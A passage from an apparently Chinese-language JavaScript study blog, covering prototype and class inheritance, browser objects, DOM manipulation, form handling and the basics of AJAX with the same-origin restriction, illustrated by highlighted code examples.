&#x3D; props.name;</span><br><span class=\"line\">\tthis.grade &#x3D; props.grade;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">Student.prototype.hello &#x3D; function()&#123;</span><br><span class=\"line\">\talert(&#39;hello&#39;+this.name+&#39;.&#39;);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">function createStudent(props)&#123;</span><br><span class=\"line\">\treturn new Student(props);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>要让创建的对象共享一个<code>hello</code>函数，根据对象的属性查找原则，我们只要把<code>hello</code>函数移动到<code>xiaoming</code>、<code>xiaohong</code>这些对象共同的原型上就可以了，也就是<code>Student.prototype</code></p>\n<p><img src=\"/2020/07/09/javascript%E5%AD%A6%E4%B9%A0/image-20200730200247420.png\" alt=\"image-20200730200247420\"></p>\n<h2 id=\"原型继承\"><a href=\"#原型继承\" class=\"headerlink\" title=\"原型继承\"></a>原型继承</h2><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">Student</span>(<span class=\"params\">props</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.name = props.name || <span class=\"string\">'Unnamed'</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">Student.prototype.hello = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    alert(<span class=\"string\">'Hello, '</span> + <span class=\"keyword\">this</span>.name + <span class=\"string\">'!'</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">PrimaryStudent</span>(<span class=\"params\">props</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">// 调用Student构造函数，绑定this变量:</span></span><br><span class=\"line\">    Student.call(<span class=\"keyword\">this</span>, props);</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.grade = props.grade || <span class=\"number\">1</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">new</span> PrimaryStudent() ----&gt; PrimaryStudent.prototype ----&gt; <span class=\"built_in\">Object</span>.prototype ----&gt; <span class=\"literal\">null</span></span><br></pre></td></tr></table></figure>\n<p>理解新的原型链</p>\n<p><img src=\"/2020/07/09/javascript%E5%AD%A6%E4%B9%A0/image-20200730203439073.png\" alt=\"image-20200730203439073\"></p>\n<h2 id=\"class继承\"><a href=\"#class继承\" class=\"headerlink\" title=\"class继承\"></a>class继承</h2><p><strong>class创建对象</strong></p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Student</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">constructor</span>(name) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.name = name;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    hello() &#123;</span><br><span class=\"line\">        alert(<span class=\"string\">'Hello, '</span> + <span class=\"keyword\">this</span>.name + <span class=\"string\">'!'</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">var</span> xiaoming = <span class=\"keyword\">new</span> Student(<span class=\"string\">'xiaoming'</span>);</span><br><span class=\"line\">xiaoming.hello();</span><br></pre></td></tr></table></figure>\n<p><strong>class继承</strong></p>\n<p>直接通过<code>extends</code>实现</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">PrimaryStudent</span> <span class=\"keyword\">extends</span> <span class=\"title\">Student</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">constructor</span>(name, grade) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">super</span>(name); <span class=\"comment\">// 记得用super调用父类的构造方法!</span></span><br><span class=\"line\">        <span class=\"keyword\">this</span>.grade = grade;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    myGrade() &#123;</span><br><span class=\"line\">        alert(<span class=\"string\">'I am at grade '</span> + <span class=\"keyword\">this</span>.grade);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>需要通过<code>super(name)</code>来调用父类的构造函数，否则父类的<code>name</code>属性无法正常初始化。</p>\n<h1 id=\"浏览器\"><a href=\"#浏览器\" class=\"headerlink\" title=\"浏览器\"></a>浏览器</h1><h2 id=\"浏览器对象\"><a href=\"#浏览器对象\" class=\"headerlink\" title=\"浏览器对象\"></a>浏览器对象</h2><p><strong>window</strong></p>\n<p><code>window</code>对象不但充当全局作用域，而且表示浏览器窗口。</p>\n<ul>\n<li><code>innerWidth</code> <code>innerHeight</code>可以获取浏览器窗口的内部高度和宽度</li>\n<li><code>outerWidth</code> <code>outerHeight</code>获取浏览器窗口的整个宽高</li>\n</ul>\n<p><strong>navigator</strong></p>\n<p><code>navigator</code>对象表示浏览器的信息，最常用的属性包括：</p>\n<ul>\n<li>navigator.appName：浏览器名称；</li>\n<li>navigator.appVersion：浏览器版本；</li>\n<li>navigator.language：浏览器设置的语言；</li>\n<li>navigator.platform：操作系统类型；</li>\n<li>navigator.userAgent：浏览器设定的<code>User-Agent</code>字符串。</li>\n</ul>\n<h3 id=\"screen\"><a href=\"#screen\" class=\"headerlink\" title=\"screen\"></a>screen</h3><p><code>screen</code>对象表示屏幕的信息，常用的属性有：</p>\n<ul>\n<li>screen.width：屏幕宽度，以像素为单位；</li>\n<li>screen.height：屏幕高度，以像素为单位；</li>\n<li>screen.colorDepth：返回颜色位数，如8、16、24。</li>\n</ul>\n<h3 id=\"location\"><a href=\"#location\" class=\"headerlink\" title=\"location\"></a>location</h3><p><code>location</code>对象表示当前页面的URL信息。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">location.href  &#x2F;&#x2F;url</span><br><span class=\"line\">location.protocol; &#x2F;&#x2F; &#39;http&#39;</span><br><span class=\"line\">location.host; &#x2F;&#x2F; &#39;www.example.com&#39;</span><br><span class=\"line\">location.port; &#x2F;&#x2F; &#39;8080&#39;</span><br><span class=\"line\">location.pathname; &#x2F;&#x2F; &#39;&#x2F;path&#x2F;index.html&#39;</span><br><span class=\"line\">location.search; &#x2F;&#x2F; &#39;?a&#x3D;1&amp;b&#x3D;2&#39;</span><br><span class=\"line\">location.hash; &#x2F;&#x2F; &#39;TOP&#39;</span><br><span class=\"line\">location.assign(&#39;...&#39;)  &#x2F;&#x2F;加载一个新的页面</span><br><span class=\"line\">location.reload()  &#x2F;&#x2F;重新加载当前页面</span><br></pre></td></tr></table></figure>\n<h3 id=\"document\"><a href=\"#document\" class=\"headerlink\" title=\"document\"></a>document</h3><p><code>document</code>对象表示当前页面。由于HTML在浏览器中以DOM形式表示为树形结构，<code>document</code>对象就是整个DOM树的根节点。</p>\n<p>用<code>document</code>对象提供的<code>getElementById()</code>和<code>getElementsByTagName()</code>可以按ID获得一个DOM节点和按Tag名称获得一组DOM节点</p>\n<p><code>document</code>对象还有一个<code>cookie</code>属性，可以获取当前页面的Cookie。JavaScript可以通过<code>document.cookie</code>读取到当前页面的Cookie。</p>\n<h3 id=\"history\"><a href=\"#history\" class=\"headerlink\" title=\"history\"></a>history</h3><p><code>history</code>对象保存了浏览器的历史记录，JavaScript可以调用<code>history</code>对象的<code>back()</code>或<code>forward ()</code>，相当于用户点击了浏览器的“后退”或“前进”按钮。但现在不使用。</p>\n<h2 id=\"操作DOM\"><a href=\"#操作DOM\" class=\"headerlink\" title=\"操作DOM\"></a>操作DOM</h2><p>由于HTML文档被浏览器解析后就是一棵DOM树，要改变HTML的结构，就需要通过JavaScript来操作DOM。</p>\n<p>始终记住DOM是一个树形结构。操作一个DOM节点实际上就是这么几个操作：</p>\n<ul>\n<li>更新：更新该DOM节点的内容，相当于更新了该DOM节点表示的HTML的内容；</li>\n<li>遍历：遍历该DOM节点下的子节点，以便进行进一步操作；</li>\n<li>添加：在该DOM节点下新增一个子节点，相当于动态增加了一个HTML节点；</li>\n<li>删除：将该节点从HTML中删除，相当于删掉了该DOM节点的内容以及它包含的所有子节点。</li>\n</ul>\n<p>在操作一个DOM节点前，我们需要通过各种方式先拿到这个DOM节点。最常用的方法是<code>document.getElementById()</code>和<code>document.getElementsByTagName()</code>，以及CSS选择器<code>document.getElementsByClassName()</code>。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">document.getElementById(&#39;test&#39;);  &#x2F;&#x2F; 返回ID为&#39;test&#39;的节点：</span><br><span class=\"line\">ocument.getElementById(&#39;test-table&#39;).getElementsByTagName(&#39;tr&#39;);  &#x2F;&#x2F; 先定位ID为&#39;test-table&#39;的节点，再返回其内部所有tr节点：</span><br><span class=\"line\">document.getElementById(&#39;test-div&#39;).getElementsByClassName(&#39;red&#39;);  &#x2F;&#x2F; 先定位ID为&#39;test-div&#39;的节点，再返回其内部所有class包含red的节点：</span><br><span class=\"line\">test.firstElementChild &#x2F;&#x2F;test下第一个结点</span><br><span class=\"line\">test.lastElementChild  &#x2F;&#x2F;test下最后一个结点</span><br></pre></td></tr></table></figure>\n<p>第二种方法是使用<code>querySelector()</code>和<code>querySelectorAll()</code>，需要了解selector语法，然后使用条件来获取节点，更加方便。</p>\n<p><strong>作业</strong></p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!-- HTML结构 --&gt;</span><br><span class=\"line\">&lt;div id=<span class=\"string\">\"test-div\"</span>&gt;</span><br><span class=\"line\">&lt;div <span class=\"class\"><span class=\"keyword\">class</span></span>=<span class=\"string\">\"c-red\"</span>&gt;</span><br><span class=\"line\">    &lt;p id=<span class=\"string\">\"test-p\"</span>&gt;JavaScript&lt;<span class=\"regexp\">/p&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">    &lt;p&gt;Java&lt;/</span>p&gt;</span><br><span class=\"line\">  &lt;<span class=\"regexp\">/div&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">  &lt;div class=\"c-red c-green\"&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">    &lt;p&gt;Python&lt;/</span>p&gt;</span><br><span class=\"line\">    &lt;p&gt;Ruby&lt;<span class=\"regexp\">/p&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">    &lt;p&gt;Swift&lt;/</span>p&gt;</span><br><span class=\"line\">  &lt;<span class=\"regexp\">/div&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">  &lt;div class=\"c-green\"&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">    &lt;p&gt;Scheme&lt;/</span>p&gt;</span><br><span class=\"line\">    &lt;p&gt;Haskell&lt;<span class=\"regexp\">/p&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">  &lt;/</span>div&gt;</span><br><span class=\"line\">&lt;<span class=\"regexp\">/div&gt;</span></span><br><span class=\"line\"><span class=\"regexp\"></span></span><br><span class=\"line\"><span class=\"regexp\">/</span><span class=\"regexp\">/ 选择&lt;p&gt;JavaScript&lt;/</span>p&gt;:</span><br><span class=\"line\"><span class=\"keyword\">var</span> js = <span class=\"built_in\">document</span>.getElementById(<span class=\"string\">'test-p'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 选择&lt;p&gt;Python&lt;/p&gt;,&lt;p&gt;Ruby&lt;/p&gt;,&lt;p&gt;Swift&lt;/p&gt;:</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> arr = <span class=\"built_in\">document</span>.getElementsByClassName(<span class=\"string\">'c-red'</span>)[<span class=\"number\">1</span>].getElementsByTagName(<span class=\"string\">'p'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 选择&lt;p&gt;Haskell&lt;/p&gt;:</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> haskell = <span class=\"built_in\">document</span>.getElementsByClassName(<span class=\"string\">'c-green'</span>)[<span class=\"number\">1</span>].lastElementChild;</span><br></pre></td></tr></table></figure>\n<h3 id=\"更新DOM\"><a href=\"#更新DOM\" class=\"headerlink\" title=\"更新DOM\"></a>更新DOM</h3><p>一种是修改<code>innerHTML</code>属性，这个方式非常强大，不但可以修改一个DOM节点的文本内容，还可以直接通过HTML片段修改DOM节点内部的子树</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F;获取&lt;p id &#x3D; &#39;p&#39;&gt;...&lt;&#x2F;p&gt;</span><br><span class=\"line\">var p &#x3D; document.getElementById(&#39;p&#39;);</span><br><span class=\"line\">p.innerHTML &#x3D; &#39;ABC&#39;</span><br><span class=\"line\">&#x2F;&#x2F;&lt;p id &#x3D; &#39;p&#39;&gt;ABC&lt;&#x2F;p&gt;</span><br></pre></td></tr></table></figure>\n<p>第二种是修改<code>innerText</code>或<code>textContent</code>属性，这样可以自动对字符串进行HTML编码，保证无法设置任何HTML标签</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F; 获取&lt;p id&#x3D;&quot;p-id&quot;&gt;...&lt;&#x2F;p&gt;</span><br><span class=\"line\">var p &#x3D; document.getElementById(&#39;p-id&#39;);</span><br><span class=\"line\">&#x2F;&#x2F; 设置文本:</span><br><span class=\"line\">p.innerText &#x3D; &#39;&lt;script&gt;alert(&quot;Hi&quot;)&lt;&#x2F;script&gt;&#39;;</span><br><span class=\"line\">&#x2F;&#x2F; HTML被自动编码，无法设置一个&lt;script&gt;节点:</span><br><span class=\"line\">&#x2F;&#x2F; &lt;p id&#x3D;&quot;p-id&quot;&gt;&lt;script&gt;alert(&quot;Hi&quot;)&lt;&#x2F;script&gt;&lt;&#x2F;p&gt;</span><br></pre></td></tr></table></figure>\n<h3 id=\"插入DOM\"><a href=\"#插入DOM\" class=\"headerlink\" title=\"插入DOM\"></a>插入DOM</h3><p>一个是使用<code>appendChild</code>，把一个子节点添加到父节点的最后一个子节点。</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!-- HTML结构 --&gt;</span><br><span class=\"line\">&lt;p id=<span class=\"string\">\"js\"</span>&gt;JavaScript&lt;<span class=\"regexp\">/p&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">&lt;div id=\"list\"&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">    &lt;p id=\"java\"&gt;Java&lt;/</span>p&gt;</span><br><span class=\"line\">    &lt;p id=<span class=\"string\">\"python\"</span>&gt;Python&lt;<span class=\"regexp\">/p&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">    &lt;p id=\"scheme\"&gt;Scheme&lt;/</span>p&gt;</span><br><span class=\"line\">&lt;<span class=\"regexp\">/div&gt;</span></span><br><span class=\"line\"><span class=\"regexp\"></span></span><br><span class=\"line\"><span class=\"regexp\">var list = document.getElementById('list');</span></span><br><span class=\"line\"><span class=\"regexp\">js = document.createElement('p');</span></span><br><span class=\"line\"><span class=\"regexp\">js.id = 'js';</span></span><br><span class=\"line\"><span class=\"regexp\">js.innerText = 'javascript';</span></span><br><span class=\"line\"><span class=\"regexp\">list.appendChild(js);</span></span><br></pre></td></tr></table></figure>\n<p>另一个是<code>insertBefore</code>，可以使用<code>parentElement.insertBefore(newElement, referenceElement);</code></p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span></span><br><span class=\"line\">    list = <span class=\"built_in\">document</span>.getElementById(<span class=\"string\">'list'</span>),</span><br><span class=\"line\">    ref = <span class=\"built_in\">document</span>.getElementById(<span class=\"string\">'python'</span>),</span><br><span class=\"line\">    haskell = <span class=\"built_in\">document</span>.createElement(<span class=\"string\">'p'</span>);</span><br><span class=\"line\">haskell.id = <span class=\"string\">'haskell'</span>;</span><br><span class=\"line\">haskell.innerText = <span class=\"string\">'Haskell'</span>;</span><br><span class=\"line\">list.insertBefore(haskell, ref);</span><br></pre></td></tr></table></figure>\n<h3 id=\"删除DOM\"><a href=\"#删除DOM\" class=\"headerlink\" title=\"删除DOM\"></a>删除DOM</h3><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;div id=<span class=\"string\">\"parent\"</span>&gt;</span><br><span class=\"line\">    &lt;p&gt;First&lt;<span class=\"regexp\">/p&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">    &lt;p&gt;Second&lt;/</span>p&gt;</span><br><span class=\"line\">&lt;<span class=\"regexp\">/div&gt;</span></span><br><span class=\"line\"><span class=\"regexp\"></span></span><br><span class=\"line\"><span class=\"regexp\">var parent = document.getElementById('parent');</span></span><br><span class=\"line\"><span class=\"regexp\">parent.removeChild(parent.children[0]);</span></span><br><span class=\"line\"><span class=\"regexp\">parent.removeChild(parent.children[1]); /</span><span class=\"regexp\">/ &lt;-- 浏览器报错</span></span><br></pre></td></tr></table></figure>\n<p>浏览器报错：<code>parent.children[1]</code>不是一个有效的节点。原因就在于，当<code>&lt;p&gt;First&lt;/p&gt;</code>节点被删除后，<code>parent.children</code>的节点数量已经从2变为了1，索引<code>[1]</code>已经不存在了。</p>\n<h2 id=\"操作表单\"><a href=\"#操作表单\" class=\"headerlink\" title=\"操作表单\"></a>操作表单</h2><p>HTML表单的输入控件主要有以下几种：</p>\n<ul>\n<li>文本框，对应的<code>&lt;input type=&quot;text&quot;&gt;</code>，用于输入文本；</li>\n<li>口令框，对应的<code>&lt;input type=&quot;password&quot;&gt;</code>，用于输入口令；</li>\n<li>单选框，对应的<code>&lt;input type=&quot;radio&quot;&gt;</code>，用于选择一项；</li>\n<li>复选框，对应的<code>&lt;input type=&quot;checkbox&quot;&gt;</code>，用于选择多项；</li>\n<li>下拉框，对应的<code>&lt;select&gt;</code>，用于选择一项；</li>\n<li>隐藏文本，对应的<code>&lt;input type=&quot;hidden&quot;&gt;</code>，用户不可见，但表单提交时会把隐藏文本发送到服务器。</li>\n</ul>\n<h3 id=\"获取值\"><a href=\"#获取值\" class=\"headerlink\" title=\"获取值\"></a>获取值</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var input &#x3D; document.getElementById(&#39;email&#39;);</span><br><span class=\"line\">input.value  &#x2F;&#x2F;用户输入的值</span><br></pre></td></tr></table></figure>\n<h3 id=\"设置值\"><a href=\"#设置值\" class=\"headerlink\" title=\"设置值\"></a>设置值</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var input &#x3D; document.getElementById(&#39;email&#39;);</span><br><span class=\"line\">input.value &#x3D; &#39;test&#39;;  &#x2F;&#x2F;文本框内容已被设置</span><br></pre></td></tr></table></figure>\n<h3 id=\"HTML5控件\"><a href=\"#HTML5控件\" class=\"headerlink\" title=\"HTML5控件\"></a>HTML5控件</h3><p>HTML5新增了大量标准控件，常用的包括<code>date</code>、<code>datetime</code>、<code>datetime-local</code>、<code>color</code>等，它们都使用<code>&lt;input&gt;</code>标签。</p>\n<h3 id=\"提交表单\"><a href=\"#提交表单\" class=\"headerlink\" title=\"提交表单\"></a>提交表单</h3><p>方式一是通过<code>&lt;form&gt;</code>元素的<code>submit()</code>方法提交一个表单，例如，响应一个<code>&lt;button&gt;</code>的<code>click</code>事件，在JavaScript代码中提交表单。</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!-- HTML --&gt;</span><br><span class=\"line\">&lt;form id=<span class=\"string\">\"test-form\"</span>&gt;</span><br><span class=\"line\">    &lt;input type=<span class=\"string\">\"text\"</span> name=<span class=\"string\">\"test\"</span>&gt;</span><br><span class=\"line\">    &lt;button type=<span class=\"string\">\"button\"</span> onclick=<span class=\"string\">\"doSubmitForm()\"</span>&gt;Submit&lt;<span class=\"regexp\">/button&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">&lt;/</span>form&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;script&gt;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">doSubmitForm</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> form = <span class=\"built_in\">document</span>.getElementById(<span class=\"string\">'test-form'</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 可以在此修改form的input...</span></span><br><span class=\"line\">    <span class=\"comment\">// 提交form:</span></span><br><span class=\"line\">    form.submit();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">&lt;<span class=\"regexp\">/script&gt;</span></span><br></pre></td></tr></table></figure>\n<p>第二种方式是响应<code>&lt;form&gt;</code>本身的<code>onsubmit</code>事件，在提交form时作修改。</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!-- HTML --&gt;</span><br><span class=\"line\">&lt;form id=<span class=\"string\">\"test-form\"</span> onsubmit=<span class=\"string\">\"return checkForm()\"</span>&gt;</span><br><span class=\"line\">    &lt;input type=<span class=\"string\">\"text\"</span> name=<span class=\"string\">\"test\"</span>&gt;</span><br><span class=\"line\">    &lt;button type=<span class=\"string\">\"submit\"</span>&gt;Submit&lt;<span class=\"regexp\">/button&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">&lt;/</span>form&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;script&gt;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">checkForm</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> form = <span class=\"built_in\">document</span>.getElementById(<span class=\"string\">'test-form'</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 可以在此修改form的input...</span></span><br><span class=\"line\">    <span class=\"comment\">// 继续下一步:</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">&lt;<span class=\"regexp\">/script&gt;</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"操作文件\"><a href=\"#操作文件\" class=\"headerlink\" title=\"操作文件\"></a>操作文件</h2><p>在HTML表单中，可以上传文件的唯一控件就是<code>&lt;input type=&quot;file&quot;&gt;</code>。</p>\n<p><em>注意</em>：当一个表单包含<code>&lt;input type=&quot;file&quot;&gt;</code>时，表单的<code>enctype</code>必须指定为<code>multipart/form-data</code>，<code>method</code>必须指定为<code>post</code>，浏览器才能正确编码并以<code>multipart/form-data</code>格式发送表单的数据。</p>\n<p>出于安全考虑，浏览器只允许用户点击<code>&lt;input type=&quot;file&quot;&gt;</code>来选择本地文件，用JavaScript对<code>&lt;input type=&quot;file&quot;&gt;</code>的<code>value</code>赋值是没有任何效果的。当用户选择了上传某个文件后，JavaScript也无法获得该文件的真实路径。</p>\n<h2 id=\"AJAX\"><a href=\"#AJAX\" class=\"headerlink\" title=\"*AJAX\"></a>*AJAX</h2><p>如果要让用户留在当前页面中，同时发出新的HTTP请求，就必须用JavaScript发送这个新请求，接收到数据后，再用JavaScript更新页面，这样一来，用户就感觉自己仍然停留在当前页面，但是数据却可以不断地更新。</p>\n<p>用JavaScript写一个完整的AJAX代码并不复杂，但是需要注意：<strong>AJAX请求是异步执行的，也就是说，要通过回调函数获得响应</strong>。</p>\n<p>当创建了<code>XMLHttpRequest</code>对象后，要先设置<code>onreadystatechange</code>的回调函数。在回调函数中，通常我们只需通过<code>readyState === 4</code>判断请求是否完成，如果已完成，再根据<code>status === 200</code>判断是否是一个成功的响应。</p>\n<p><code>XMLHttpRequest</code>对象的<code>open()</code>方法有3个参数，第一个参数指定是<code>GET</code>还是<code>POST</code>，第二个参数指定URL地址，第三个参数指定是否使用异步，默认是<code>true</code>，所以不用写。</p>\n<p><em>注意</em>，千万不要把第三个参数指定为<code>false</code>，否则浏览器将停止响应，直到AJAX请求完成。如果这个请求耗时10秒，那么10秒内你会发现浏览器处于“假死”状态。</p>\n<p>最后调用<code>send()</code>方法才真正发送请求。<code>GET</code>请求不需要参数，<code>POST</code>请求需要把body部分以字符串或者<code>FormData</code>对象传进去。</p>\n<p><strong>安全限制</strong></p>\n<p>上面代码的URL使用的是相对路径。如果你把它改为<code>&#39;http://www.sina.com.cn/&#39;</code>，再运行，肯定报错。在Chrome的控制台里，还可以看到错误信息。默认情况下，<strong>JavaScript在发送AJAX请求时，URL的域名必须和当前页面完全一致。完全一致的意思是，域名要相同（<code>www.example.com</code>和<code>example.com</code>不同），协议要相同（<code>http</code>和<code>https</code>不同），端口号要相同（默认是<code>:80</code>端口，它和<code>:8080</code>就不同）。</strong>有的浏览器口子松一点，允许端口不同，大多数浏览器都会严格遵守这个限制。</p>\n<p>JS请求外域的URL：</p>\n<p>一是通过Flash插件发送HTTP请求，这种方式可以绕过浏览器的安全限制，但必须安装Flash，并且跟Flash交互。不过Flash用起来麻烦，而且现在用得也越来越少了。</p>\n<p>二是通过在同源域名下架设一个代理服务器来转发，JavaScript负责把请求发送到代理服务器：代理服务器再把结果返回，这样就遵守了浏览器的同源策略。这种方式麻烦之